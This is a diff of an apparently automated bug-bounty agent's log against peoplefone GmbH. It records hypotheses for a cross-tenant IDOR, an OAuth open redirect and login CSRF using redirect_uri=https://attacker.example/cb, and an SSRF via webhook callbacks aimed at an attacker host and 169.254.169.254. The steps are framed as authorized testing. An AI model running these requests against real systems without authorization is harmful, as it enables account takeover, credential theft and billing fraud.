@@ -3726,3 +3726,31 @@ testability: AUTH_HELPED
 [LEARN] ACCEPTED OTH @ pipeline: triage.yml:45 literal `\[UNVALIDATED\]` grep reconfirmed INTACT via repo read this cycle; anchored `^\[HYP\]|^\[NEXT\]` matches 370+332 lines ready; gate cannot emit fresh VALID re-confirmation; fix outstanding 18+ cycles.
 [LEARN] REJECTED MISCONFIG @ *.peoplefone.com: unchanged — 19 guessed subdomains NXDOMAIN, no wildcard, no dangling CNAME targets; reposcan yields no in-scope surface.
 [RISK] peoplefone GmbH: 82/100 — 63rd frozen cycle; live surface static (fresh 01:10Z baseline). Sole report-ready finding (OAuth open-redirect+login-CSRF, VALID 7.4/9.1) remains UNSENT (valid-bugs=0); config IDOR (85) + SSRF (78) token-gated behind agent-unacquirable bearer. Both risk-movers (report submission + triage.yml:45 fix) human-owned, outstanding 18+ cycles. Risk drops only on a valid-bugs increment; held at 82.
+## 2026-09-17 06:13:47 UTC [target] (model bigpickle)
+[HYP] Cross-tenant PBX takeover via Configuration API sequential identifier enumeration (8 resource types)
+class: IDOR
+asset: configuration-api.peoplefone.com/customer/voip/v1/{users,groups,ivrs,queues,numbers,smart-routings,callforwarding,manual-routing}/{identifier}
+confidence: 85
+reasoning: 235KB OpenAPI spec harvested from api.peoplefone.com dev portal; numeric sequential identifiers; explicit authorization-boundary statement present but enforcement unproven; UserResponse exposes sipUserName+email+address; all backends 401-gated (live 401 probed); register 500 global closes agent-side token minting; 63+ cycles zero counter-evidence; cross-model rank holds
+evidence_needed: tenant-A bearer token returns tenant-B {identifier} objects via ±1 enumeration; no tenant marker on response
+verify_steps: (authorized, read-only) GET /customer/voip/v1/users/{own_id+1}, /numbers/{did}, /callforwarding/{id}, /callforwarding/{id}; compare tenant markers and UserResponse PII against caller's tenant
+impact: cross-tenant PBX takeover — SIP creds, PII, DID routing, billing fraud; CRITICAL
+testability: AUTH_HELPED
+[HYP] OAuth open-redirect + login-CSRF via unrestricted redirect_uri (client_id=1), cookie-seeded stateless variant
+class: AUTH
+asset: auth.peoplefone.com/oauth/authorize (+ /oauth/token)
+confidence: 62
+reasoning: stateless authorize 404 yet sets encrypted attacker-value redirect_uri cookie (secure, httponly, 1y) proving param processed server-side; warm portal-session 302 preserved arbitrary redirect_uri (traced 09-05); /oauth/token enforces client_secret for 1/4/5 (code-theft ATO falsified 09-07); ceiling implicit-fragment ATO requires warm-session repro — HUMAN_ONLY; gate VALID 7.4 (9.1 conditional) last contentful 09-12 14:13
+evidence_needed: warm-session authorize 302 preserves attacker redirect_uri AND returns #access_token fragment
+verify_steps: (authorized, human) portal.peoplefone.ch login → GET /oauth/authorize?client_id=1&response_type=token&redirect_uri=https://attacker.example/cb → inspect 302 chain for fragment; else the open-redirect+login-CSRF (7.4) is already provable
+impact: silent portal-user ATO if implicit fragment; open-redirect+login-CSRF otherwise; CRITICAL conditional
+testability: HUMAN_ONLY
+[HYP] Cloud metadata/IAM theft via 5 webhook/callback endpoints with zero host/scheme validation
+class: SSRF
+asset: api.peoplefone.com sms/callbackUrl + call-api smart-routings/{id}/webhook + uaCSTA callbackUrl/monitoringCallbackUrl + configuration-api external-number-lookup webhookUrl
+confidence: 78
+reasoning: format:uri with no enum/allowlist across 5 endpoints in harvested specs; External Number Lookup forwards customer Authorization/X-API-Key headers to the URL; deprecated External Routing (2026-09-30) repeats pattern; zero counter-evidence 63+ cycles
+evidence_needed: post-auth callback reaching attacker host; 169.254.169.254 / private ranges unfiltered
+verify_steps: (authorized) POST SMS callbackUrl=https://attacker/x and http://169.254.169.254; attacker-side receipt only, no reads of internal responses
+impact: cloud metadata/IAM theft, SIP/PBX internal pivot, call-metadata leak; CRITICAL
+testability: AUTH_HELPED
